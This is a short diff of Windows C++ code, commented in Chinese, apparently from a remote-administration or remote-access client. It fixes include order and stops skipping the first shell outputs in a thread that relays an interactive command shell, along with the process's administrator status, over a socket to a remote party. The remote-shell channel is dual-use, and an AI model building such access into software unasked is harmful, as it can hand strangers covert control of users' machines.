@@ -5,8 +5,11 @@
 #ifndef WIN32_LEAN_AND_MEAN
 #define WIN32_LEAN_AND_MEAN
 #endif
-#include <winsock2.h>
+#ifndef _WINSOCKAPI_
+#define _WINSOCKAPI_
+#endif
 #include <windows.h>
+#include <winsock2.h>
 #include <process.h>
 #include <string>
 #include <vector>
@@ -77,21 +80,19 @@ unsigned __stdcall ReadPipeThread(void* pParam) {
         if (ReadFile(hReadPipeOut, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
             buffer[bytesRead] = '\0';
             
-            // 前两次输出包含chcp切换信息，跳过
-            outputCount++;
-            if (outputCount <= 2) {
-                if (!headerSent) {
-                    // 在跳过初始输出后发送欢迎消息
-                    std::string startMsg = "Interactive Terminal Opened\r\n";
-                    startMsg += "--------------------------------------------------\r\n";
-                    startMsg += "[System] Remote terminal started...\r\n";
-                    startMsg += "[System] Current privileges: ";
-                    startMsg += IsAdminLocal() ? "Administrator\r\n" : "User\r\n";
-                    startMsg += "--------------------------------------------------\r\n\r\n";
-                    SendResponse(g_socket, CMD_TERMINAL_DATA, startMsg.c_str(), (int)startMsg.size());
-                    headerSent = true;
-                }
-                continue; // 跳过chcp输出
+            if (!headerSent) {
+                // 发送欢迎消息
+                std::string startMsg = "Interactive Terminal Opened\r\n";
+                startMsg += "--------------------------------------------------\r\n";
+                startMsg += "[System] Remote terminal started...\r\n";
+                startMsg += "[System] Current privileges: ";
+                startMsg += IsAdminLocal() ? "Administrator\r\n" : "User\r\n";
+                startMsg += "--------------------------------------------------\r\n\r\n";
+                SendResponse(g_socket, CMD_TERMINAL_DATA, startMsg.c_str(), (int)startMsg.size());
+                headerSent = true;
+                
+                // 如果输出包含 chcp 信息，我们可以选择性忽略它，或者直接显示
+                // 这里我们选择直接显示，以确保不漏掉任何反馈
             }
             
             // 发送实际的终端输出
